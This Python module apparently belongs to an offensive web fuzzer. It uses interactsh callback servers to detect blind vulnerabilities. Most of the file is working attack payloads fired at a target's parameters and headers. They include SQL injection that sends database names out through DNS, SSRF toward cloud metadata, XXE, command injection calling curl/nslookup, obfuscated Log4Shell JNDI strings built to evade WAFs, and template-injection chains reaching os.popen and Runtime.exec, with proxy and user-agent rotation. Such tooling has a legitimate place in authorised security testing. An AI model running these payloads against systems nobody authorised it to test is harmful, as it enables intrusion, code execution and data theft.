"""
modules/oob.py
Out-of-Band (OOB) Detection Engine.

Integrates with interactsh (ProjectDiscovery's free Burp Collaborator
alternative) to detect blind vulnerabilities that never show up in
response analysis:
  - Blind SQL injection (DNS/HTTP exfiltration)
  - Blind SSRF (server reaching out)
  - XXE with external entity resolution
  - Blind XSS (callback on victim browser)
  - Log4Shell / SSTI with DNS callbacks
  - Command injection with DNS ping

Architecture:
  1. OOBCollector  — registers a session with interactsh, polls for callbacks
  2. OOBPayloadGen — generates payloads for each vuln class with the callback domain
  3. OOBCheck      — DeepFuzzCheck subclass that fires OOB probes per param
  4. OOBResult     — represents a confirmed OOB interaction

Usage in ParamFuzzer:
    oob = OOBCollector()
    if oob.available():
        oob.start()
        gen = OOBPayloadGen(oob.domain)
        # ... inject payloads, wait, poll ...
        hits = oob.poll()
        oob.stop()
"""

import json
import re
import threading
import time
import uuid
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Tuple
from urllib.parse import urlparse
from urllib.request import urlopen, Request
from urllib.error import URLError, HTTPError

from ..utils import log, log_section, vlog, col, C


# -----------------------------------------------------------------
#  INTERACTSH PUBLIC SERVERS  (fallback chain)
# -----------------------------------------------------------------
INTERACTSH_SERVERS = [
    "https://oast.pro",
    "https://oast.live",
    "https://oast.site",
    "https://oast.online",
    "https://oast.fun",
    "https://interact.sh",
]

_REGISTER_PATH  = "/register"
_POLL_PATH      = "/poll"
_DEREGISTER_PATH = "/deregister"

# How long to wait for an OOB callback before giving up on a probe
OOB_CALLBACK_WAIT_S: float = 8.0

# Max interactions to fetch per poll
_POLL_LIMIT = 100


# -----------------------------------------------------------------
#  DATA TYPES
# -----------------------------------------------------------------
@dataclass
class OOBInteraction:
    """A single callback interaction received by interactsh."""
    interaction_type: str        # "dns", "http", "smtp"
    raw_request:      str = ""
    remote_address:   str = ""
    timestamp:        str = ""
    protocol:         str = ""
    unique_id:        str = ""   # subdomain prefix we embedded in payload
    full_id:          str = ""   # complete subdomain that was seen


@dataclass
class OOBProbeResult:
    """Result of an OOB probe — tied back to a specific param/check."""
    check:       str
    severity:    str
    param:       str
    payload:     str
    url:         str
    interaction: OOBInteraction
    cwe:         str = ""
    evidence:    str = ""


# -----------------------------------------------------------------
#  OOB COLLECTOR
# -----------------------------------------------------------------
class OOBCollector:
    """
    Manages a session with an interactsh server.

    Lifecycle:
        collector = OOBCollector()
        if collector.available():
            collector.start()
            domain = collector.domain        # e.g. abc123def456.oast.pro
            # inject domain into payloads...
            interactions = collector.poll()  # returns new OOBInteraction list
            collector.stop()
    """

    def __init__(self, server: str = "", timeout: int = 10):
        self._server        = server.rstrip("/") if server else ""
        self._timeout       = timeout
        self._secret_key    = ""
        self._correlation_id = ""
        self._domain        = ""
        self._server_url    = ""
        self._registered    = False
        self._lock          = threading.Lock()
        self._interactions: List[OOBInteraction] = []
        # Map unique_id → (check_label, param, payload, url)
        self._probe_registry: Dict[str, Tuple[str, str, str, str]] = {}

    # ------------------------------------------------------------------
    #  Public API
    # ------------------------------------------------------------------
    def available(self) -> bool:
        """Probe each public server; return True if any responds."""
        servers_to_try = [self._server] if self._server else INTERACTSH_SERVERS
        for srv in servers_to_try:
            if self._probe_server(srv):
                self._server_url = srv
                return True
        return False

    def start(self) -> bool:
        """Register a session and obtain an OOB domain."""
        if not self._server_url:
            if not self.available():
                return False
        return self._register()

    def stop(self) -> None:
        """Deregister the session (best-effort)."""
        if not self._registered:
            return
        try:
            self._http_post(
                f"{self._server_url}{_DEREGISTER_PATH}",
                {"correlation-id": self._correlation_id,
                 "secret-key":     self._secret_key},
            )
        except Exception:
            pass
        self._registered = False
        log("OOB", col("Session deregistered", C.GRAY), C.GRAY)

    @property
    def domain(self) -> str:
        """The base OOB domain for this session (e.g. abc123.oast.pro)."""
        return self._domain

    @property
    def registered(self) -> bool:
        return self._registered

    def unique_subdomain(self, label: str = "") -> str:
        """
        Generate a unique subdomain under the OOB domain.
        Embed a short label so we can identify which probe triggered it.

        e.g.  sqli-a1b2c3.abc123def.oast.pro
        """
        uid = uuid.uuid4().hex[:8]
        prefix = f"{label[:8]}-{uid}" if label else uid
        return f"{prefix}.{self._domain}"

    def register_probe(self, unique_sub: str,
                       check: str, param: str,
                       payload: str, url: str) -> None:
        """Record what probe corresponds to this subdomain prefix."""
        # unique_sub is like "sqli-a1b2c3.abc123.oast.pro"
        # extract the leftmost label
        prefix = unique_sub.split(".")[0]
        with self._lock:
            self._probe_registry[prefix] = (check, param, payload, url)

    def poll(self) -> List[OOBInteraction]:
        """
        Fetch new interactions from interactsh.
        Returns only *new* interactions since last poll.
        """
        if not self._registered:
            return []
        try:
            resp = self._http_get(
                f"{self._server_url}{_POLL_PATH}"
                f"?id={self._correlation_id}&secret={self._secret_key}",
            )
            raw_interactions = resp.get("data") or []
            aes_key = resp.get("aes_key", "")

            new: List[OOBInteraction] = []
            for item in raw_interactions:
                decoded = self._decode_interaction(item, aes_key)
                if decoded:
                    with self._lock:
                        self._interactions.append(decoded)
                    new.append(decoded)
            return new
        except Exception as e:
            vlog("OOB", col(f"Poll error: {e}", C.YELLOW), C.YELLOW)
            return []

    def poll_and_correlate(self) -> List[OOBProbeResult]:
        """Poll and match interactions back to registered probes."""
        interactions = self.poll()
        results: List[OOBProbeResult] = []
        for interaction in interactions:
            uid = interaction.unique_id
            with self._lock:
                probe_meta = self._probe_registry.get(uid)
            if not probe_meta:
                # Try partial match (first 8 chars of unique_id)
                with self._lock:
                    for k, v in self._probe_registry.items():
                        if uid.startswith(k) or k.startswith(uid[:6]):
                            probe_meta = v
                            break
            if probe_meta:
                check, param, payload, url = probe_meta
                cwe = _OOB_CWE.get(check, "")
                evidence = (
                    f"{interaction.interaction_type.upper()} callback from "
                    f"{interaction.remote_address or 'unknown'} "
                    f"to {interaction.full_id} — confirmed OOB {check}"
                )
                results.append(OOBProbeResult(
                    check=check, severity="HIGH", param=param,
                    payload=payload, url=url, interaction=interaction,
                    cwe=cwe, evidence=evidence,
                ))
                log("OOB",
                    col(f"[!!!] BLIND HIT  {check}  param={param}  "
                        f"via {interaction.interaction_type.upper()}  "
                        f"from {interaction.remote_address}", C.RED + C.BOLD),
                    C.RED)
        return results

    # ------------------------------------------------------------------
    #  Internal helpers
    # ------------------------------------------------------------------
    def _probe_server(self, server: str) -> bool:
        try:
            req = Request(f"{server}/", headers={"User-Agent": "paramspecter"})
            with urlopen(req, timeout=self._timeout):
                return True
        except Exception:
            return False

    def _register(self) -> bool:
        """Register with interactsh and store session credentials."""
        try:
            # interactsh v1 API — no crypto needed for basic polling
            correlation_id = uuid.uuid4().hex[:20]
            secret_key     = uuid.uuid4().hex

            resp = self._http_post(
                f"{self._server_url}{_REGISTER_PATH}",
                {"correlation-id": correlation_id,
                 "secret-key":     secret_key,
                 "push-address":   ""},
            )
            domain = resp.get("domain", "")
            if not domain:
                # Some server versions return it differently
                domain = f"{correlation_id}.{urlparse(self._server_url).hostname}"

            self._correlation_id = correlation_id
            self._secret_key     = secret_key
            self._domain         = domain
            self._registered     = True

            log("OOB", col(
                f"Registered OOB session → {col(self._domain, C.CYAN)}  "
                f"[{urlparse(self._server_url).hostname}]", C.GREEN
            ), C.GREEN)
            return True
        except Exception as e:
            vlog("OOB", col(f"Registration failed: {e}", C.YELLOW), C.YELLOW)
            # Fallback: try the next server in the chain
            servers_to_try = INTERACTSH_SERVERS.copy()
            try:
                servers_to_try.remove(self._server_url)
            except ValueError:
                pass
            for srv in servers_to_try:
                if self._probe_server(srv):
                    self._server_url = srv
                    return self._register()
            return False

    def _decode_interaction(self, raw: str, aes_key: str) -> Optional[OOBInteraction]:
        """
        Decode a base64+AES-CFB interaction from interactsh.
        Falls back to treating raw as plain JSON if no key is provided.
        """
        try:
            # Try plain JSON first (some server versions)
            if raw.startswith("{"):
                data = json.loads(raw)
            else:
                # AES-CFB decryption
                data = self._aes_decrypt(raw, aes_key)

            if not data:
                return None

            itype    = data.get("protocol", data.get("type", "unknown")).lower()
            full_id  = data.get("full-id", data.get("unique-id", ""))
            uid      = full_id.split(".")[0] if full_id else ""

            return OOBInteraction(
                interaction_type = itype,
                raw_request      = data.get("raw-request", data.get("request", ""))[:500],
                remote_address   = data.get("remote-address", ""),
                timestamp        = data.get("timestamp", ""),
                protocol         = itype,
                unique_id        = uid,
                full_id          = full_id,
            )
        except Exception:
            return None

    def _aes_decrypt(self, b64_data: str, b64_key: str) -> Optional[Dict]:
        """AES-CFB decrypt interactsh interaction data."""
        try:
            import base64
            # Lazy import — only needed when AES encryption is used
            from Crypto.Cipher import AES
            from Crypto.Util.Padding import unpad

            key  = base64.b64decode(b64_key)
            data = base64.b64decode(b64_data)
            iv   = data[:16]
            ct   = data[16:]
            cipher = AES.new(key, AES.MODE_CFB, iv=iv, segment_size=128)
            plain  = cipher.decrypt(ct)
            return json.loads(plain.decode("utf-8"))
        except ImportError:
            # pycryptodome not installed — try base64 JSON fallback
            try:
                import base64
                plain = base64.b64decode(b64_data + "==")
                return json.loads(plain.decode("utf-8"))
            except Exception:
                return None
        except Exception:
            return None

    def _http_post(self, url: str, body: Dict) -> Dict:
        data = json.dumps(body).encode()
        req  = Request(url, data=data,
                       headers={"Content-Type": "application/json",
                                "User-Agent":    "paramspecter"},
                       method="POST")
        with urlopen(req, timeout=self._timeout) as resp:
            return json.loads(resp.read().decode() or "{}")

    def _http_get(self, url: str) -> Dict:
        req = Request(url, headers={"User-Agent": "paramspecter"})
        with urlopen(req, timeout=self._timeout) as resp:
            return json.loads(resp.read().decode() or "{}")


# -----------------------------------------------------------------
#  CWE MAP FOR OOB CHECKS
# -----------------------------------------------------------------
_OOB_CWE: Dict[str, str] = {
    "BlindSQLi":     "CWE-89 (SQL Injection — OOB)",
    "BlindSSRF":     "CWE-918 (SSRF — OOB confirmed)",
    "BlindXXE":      "CWE-611 (XXE — OOB confirmed)",
    "BlindCMDi":     "CWE-78 (Command Injection — OOB)",
    "BlindXSS":      "CWE-79 (XSS — OOB callback)",
    "Log4Shell":     "CWE-917 (Log4Shell / JNDI Injection)",
    "BlindSSTI":     "CWE-94 (SSTI — OOB DNS callback)",
}


# -----------------------------------------------------------------
#  OOB PAYLOAD GENERATOR
# -----------------------------------------------------------------
class OOBPayloadGen:
    """
    Generates OOB-callback payloads for each vulnerability class.
    Every payload embeds a unique subdomain so we can correlate
    which probe fired.

    Usage:
        gen = OOBPayloadGen(oob_collector)
        for label, payloads in gen.for_param("id"):
            for payload in payloads:
                # inject payload into ?id=<payload>
    """

    def __init__(self, collector: OOBCollector):
        self._collector = collector

    def _sub(self, label: str) -> str:
        """Get a unique subdomain + register it."""
        return self._collector.unique_subdomain(label)

    def blind_sqli(self, param: str, url: str) -> List[Tuple[str, str]]:
        """
        Returns [(payload, unique_subdomain), ...] for blind SQLi OOB.
        Covers MySQL, MSSQL, PostgreSQL, Oracle DNS exfiltration.
        """
        results = []
        for template in _BLIND_SQLI_TEMPLATES:
            sub = self._sub("sqli")
            self._collector.register_probe(sub, "BlindSQLi", param, template, url)
            payload = template.replace("{OOB}", sub)
            results.append((payload, sub))
        return results

    def blind_ssrf(self, param: str, url: str) -> List[Tuple[str, str]]:
        results = []
        for template in _BLIND_SSRF_TEMPLATES:
            sub = self._sub("ssrf")
            self._collector.register_probe(sub, "BlindSSRF", param, template, url)
            payload = template.replace("{OOB}", sub)
            results.append((payload, sub))
        return results

    def blind_xxe(self, param: str, url: str) -> List[Tuple[str, str]]:
        results = []
        for template in _BLIND_XXE_TEMPLATES:
            sub = self._sub("xxe")
            self._collector.register_probe(sub, "BlindXXE", param, template, url)
            payload = template.replace("{OOB}", sub)
            results.append((payload, sub))
        return results

    def blind_cmdi(self, param: str, url: str) -> List[Tuple[str, str]]:
        results = []
        for template in _BLIND_CMDI_TEMPLATES:
            sub = self._sub("cmdi")
            self._collector.register_probe(sub, "BlindCMDi", param, template, url)
            payload = template.replace("{OOB}", sub)
            results.append((payload, sub))
        return results

    def log4shell(self, param: str, url: str) -> List[Tuple[str, str]]:
        results = []
        for template in _LOG4SHELL_TEMPLATES:
            sub = self._sub("l4s")
            self._collector.register_probe(sub, "Log4Shell", param, template, url)
            payload = template.replace("{OOB}", sub)
            results.append((payload, sub))
        return results

    def blind_ssti(self, param: str, url: str) -> List[Tuple[str, str]]:
        results = []
        for template in _BLIND_SSTI_TEMPLATES:
            sub = self._sub("ssti")
            self._collector.register_probe(sub, "BlindSSTI", param, template, url)
            payload = template.replace("{OOB}", sub)
            results.append((payload, sub))
        return results

    def all_for_param(self, param: str, url: str) -> List[Tuple[str, str, str]]:
        """
        Returns [(check_label, payload, unique_sub), ...] for every OOB class.
        Callers iterate this and inject each payload.
        """
        out: List[Tuple[str, str, str]] = []
        for label, gen_fn in (
            ("BlindSQLi", self.blind_sqli),
            ("BlindSSRF", self.blind_ssrf),
            ("BlindXXE",  self.blind_xxe),
            ("BlindCMDi", self.blind_cmdi),
            ("Log4Shell", self.log4shell),
            ("BlindSSTI", self.blind_ssti),
        ):
            for payload, sub in gen_fn(param, url):
                out.append((label, payload, sub))
        return out


# -----------------------------------------------------------------
#  PAYLOAD TEMPLATES — {OOB} is replaced with unique subdomain
# -----------------------------------------------------------------

_BLIND_SQLI_TEMPLATES = [
    # MySQL — DNS via LOAD_FILE on UNC path (Windows only)
    "1 AND LOAD_FILE(CONCAT('\\\\\\\\',(SELECT HEX(database())),'.{OOB}\\\\a'))",
    # MySQL — OUT_FILE to UNC (Windows)
    "1 UNION SELECT LOAD_FILE(CONCAT(0x5c5c5c5c,(SELECT schema_name FROM information_schema.schemata LIMIT 1),0x2e,'{OOB}',0x5c61))--",
    # MSSQL — xp_dirtree DNS lookup
    "1; EXEC master.dbo.xp_dirtree '//{OOB}/a'--",
    "1; EXEC master..xp_subdirs '//{OOB}/'--",
    # Oracle — UTL_HTTP / UTL_INADDR DNS
    "1 AND 1=UTL_HTTP.REQUEST('http://{OOB}/')--",
    "1 AND (SELECT UTL_INADDR.get_host_address('{OOB}') FROM dual) IS NOT NULL--",
    # PostgreSQL — COPY TO
    "1;COPY (SELECT '') TO PROGRAM 'nslookup {OOB}'--",
    # Generic sleep+DNS for blind confirmation
    "1 AND 1=(SELECT 1 FROM (SELECT SLEEP(0)+(SELECT IF(1=1,1,0) FROM information_schema.tables LIMIT 1))x WHERE EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version),0x2e,'{OOB}')))--",
]

_BLIND_SSRF_TEMPLATES = [
    "http://{OOB}/ssrf",
    "https://{OOB}/ssrf",
    # URL-encoded variants (bypass simple filters)
    "http://{OOB}%2fssrf",
    # IPv6 bypass
    "http://[::ffff:{OOB}]/",
    # Protocol wrappers
    "dict://{OOB}:80/info",
    "gopher://{OOB}:80/_GET%20/",
    # AWS metadata via SSRF redirect chain
    "http://{OOB}/?url=http://169.254.169.254/latest/meta-data/",
    # @-bypass
    "http://attacker@{OOB}/",
    # Double slash bypass
    "http://{OOB}//ssrf-probe",
]

_BLIND_XXE_TEMPLATES = [
    # Classic external entity
    '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://{OOB}/xxe">]><root>&xxe;</root>',
    # Parameter entity (bypasses some filters)
    '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://{OOB}/xxe"> %xxe;]><root/>',
    # SVG XXE
    '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><image href="http://{OOB}/xxe"/></svg>',
    # Excel/ZIP-based XXE (for file upload endpoints)
    '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "http://{OOB}/file">]><data>&file;</data>',
]

_BLIND_CMDI_TEMPLATES = [
    # Unix DNS lookup variants
    "`nslookup {OOB}`",
    "$(nslookup {OOB})",
    ";nslookup {OOB};",
    "|nslookup {OOB}",
    "||nslookup {OOB}",
    "&&nslookup {OOB}",
    # curl/wget callback
    "`curl http://{OOB}/cmd`",
    "$(curl http://{OOB}/cmd)",
    # Windows
    "& nslookup {OOB} &",
    "| nslookup {OOB} |",
    # Newline injection
    "\nnslookup {OOB}\n",
]

_LOG4SHELL_TEMPLATES = [
    "${jndi:ldap://{OOB}/a}",
    "${jndi:dns://{OOB}/a}",
    "${jndi:rmi://{OOB}/a}",
    # Obfuscated variants that bypass WAFs
    "${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://{OOB}/a}",
    "${${::-j}${::-n}${::-d}${::-i}:ldap://{OOB}/a}",
    "${j${::-n}di:ldap://{OOB}/a}",
    # Headers that get logged
    # (caller should also inject into User-Agent, X-Forwarded-For, etc.)
    "${jndi:ldap://{OOB}/ua}",
]

_BLIND_SSTI_TEMPLATES = [
    # Jinja2 / Twig DNS callback via filter chain
    "{{request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__import__')('os')|attr('popen')('nslookup {OOB}')|attr('read')()}}",
    # Simpler Jinja2 subprocess
    "{{'http://{OOB}'|urlize}}",
    # Freemarker
    '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("nslookup {OOB}")}',
    # Velocity
    '#set($str=$class.inspect("java.lang.Runtime").type)#set($chr=$class.inspect("java.lang.Character").type)#set($ex=$str.exec("nslookup {OOB}"))$ex.waitFor()',
    # Smarty
    '{system("nslookup {OOB}")}',
    # Pebble — nslookup callback
    '{%% set x = "nslookup {OOB}"|shell %%}{{x}}',
]


# -----------------------------------------------------------------
#  OOB CHECK — integrates with ParamFuzzer._run_deep_fuzz
# -----------------------------------------------------------------
class OOBCheck:
    """
    Standalone OOB prober. Called by ParamFuzzer after normal
    deep-fuzz completes (or in parallel).

    Usage:
        checker = OOBCheck(session, collector, target_url, params,
                           threads, timeout, delay, stop_event)
        results = checker.run()   # returns List[OOBProbeResult]
    """

    def __init__(self, session, collector: OOBCollector, target_url: str,
                 param_list: List[str], threads: int, timeout: int,
                 delay: float, stop_event: threading.Event,
                 method: str = "GET", rotate_ua: bool = False,
                 proxy_mgr=None):
        self.session     = session
        self.collector   = collector
        self.target_url  = target_url
        self.param_list  = param_list
        self.threads     = threads
        self.timeout     = timeout
        self.delay       = delay
        self.stop_event  = stop_event
        self.method      = method.upper()
        self.rotate_ua   = rotate_ua
        self.proxy_mgr   = proxy_mgr
        self._results: List[OOBProbeResult] = []
        self._lock = threading.Lock()

    def run(self) -> List[OOBProbeResult]:
        if not self.collector.registered:
            log("OOB", col("Collector not registered — skipping OOB phase", C.YELLOW), C.YELLOW)
            return []

        gen = OOBPayloadGen(self.collector)
        log_section("PHASE: OOB BLIND DETECTION (interactsh)")
        log("OOB",
            f"Domain: {col(self.collector.domain, C.CYAN)}  "
            f"Params: {col(len(self.param_list), C.BOLD)}  "
            f"Checks: BlindSQLi, BlindSSRF, BlindXXE, BlindCMDi, Log4Shell, BlindSSTI",
            C.CYAN)

        # Build work queue: (param, label, payload, sub)
        import queue as _queue
        work_q: _queue.Queue = _queue.Queue()
        total = 0

        for param in self.param_list:
            for label, payload, sub in gen.all_for_param(param, self.target_url):
                work_q.put((param, label, payload, sub))
                total += 1

        # Also inject Log4Shell into common headers
        self._inject_log4shell_headers(gen)

        log("OOB", f"Queued {col(total, C.BOLD+C.MAGENTA)} OOB probes across {len(self.param_list)} params", C.MAGENTA)

        def _worker():
            from ..utils.http import fetch_with_retry
            from urllib.parse import quote
            while not self.stop_event.is_set():
                try:
                    param, label, payload, sub = work_q.get(timeout=1)
                except _queue.Empty:
                    break
                try:
                    proxies = self.proxy_mgr.next() if self.proxy_mgr else None
                    if self.method == "GET":
                        sep = "&" if "?" in self.target_url else "?"
                        url = f"{self.target_url}{sep}{param}={quote(str(payload), safe='')}"
                        fetch_with_retry(self.session, url, timeout=self.timeout,
                                         rotate_ua=self.rotate_ua, proxies=proxies,
                                         max_retries=0)
                    else:
                        fetch_with_retry(self.session, self.target_url, method="POST",
                                         data={param: payload}, timeout=self.timeout,
                                         rotate_ua=self.rotate_ua, proxies=proxies,
                                         max_retries=0)
                except Exception:
                    pass
                finally:
                    time.sleep(self.delay * 0.5)  # OOB probes can be tighter
                    work_q.task_done()

        workers = [threading.Thread(target=_worker, daemon=True)
                   for _ in range(min(self.threads, max(1, total)))]
        for w in workers:
            w.start()
        work_q.join()

        # Wait for callbacks to arrive
        log("OOB", col(f"All probes sent. Waiting {OOB_CALLBACK_WAIT_S}s for callbacks...", C.CYAN), C.CYAN)
        self._poll_loop(OOB_CALLBACK_WAIT_S)

        log("OOB",
            (col(f"[!!!] {len(self._results)} BLIND FINDING(S) CONFIRMED", C.RED + C.BOLD)
             if self._results
             else col("No OOB callbacks received.", C.GRAY)),
            C.RED if self._results else C.GRAY)

        return self._results

    def _poll_loop(self, wait_s: float) -> None:
        """Poll interactsh repeatedly during the wait window."""
        deadline = time.monotonic() + wait_s
        poll_interval = 1.5
        while time.monotonic() < deadline:
            hits = self.collector.poll_and_correlate()
            with self._lock:
                self._results.extend(hits)
            time.sleep(poll_interval)

    def _inject_log4shell_headers(self, gen: OOBPayloadGen) -> None:
        """
        Fire Log4Shell payloads in HTTP headers that commonly get logged:
        User-Agent, X-Forwarded-For, X-Api-Version, Referer, X-Request-Id.
        """
        from ..utils.http import fetch_with_retry
        log4_headers = [
            "User-Agent", "X-Forwarded-For", "X-Api-Version",
            "Referer", "X-Request-Id", "CF-Connecting-IP",
            "X-Originating-IP", "X-Remote-IP", "X-Remote-Addr",
        ]
        for header in log4_headers:
            if self.stop_event.is_set():
                break
            for label, payload, sub in gen.log4shell(header, self.target_url):
                try:
                    proxies = self.proxy_mgr.next() if self.proxy_mgr else None
                    fetch_with_retry(
                        self.session, self.target_url,
                        timeout=self.timeout, max_retries=0,
                        proxies=proxies,
                        **{"headers": {header: str(payload)}}
                    )
                except Exception:
                    pass


# -----------------------------------------------------------------
#  CONVENIENCE: attach OOB to a scan result dict
# -----------------------------------------------------------------
def oob_result_to_hit(result: OOBProbeResult) -> Dict:
    """Convert OOBProbeResult → the standard param_hits dict schema."""
    return {
        "check":    result.check,
        "severity": result.severity,
        "cwe":      result.cwe,
        "param":    result.param,
        "payload":  result.payload[:80],
        "url":      result.url,
        "status":   None,          # no response code for blind
        "elapsed":  0.0,
        "reflected": False,
        "evidence": result.evidence,
        "oob":      True,          # flag for reporter to mark specially
        "interaction_type": result.interaction.interaction_type,
        "remote_address":   result.interaction.remote_address,
    }
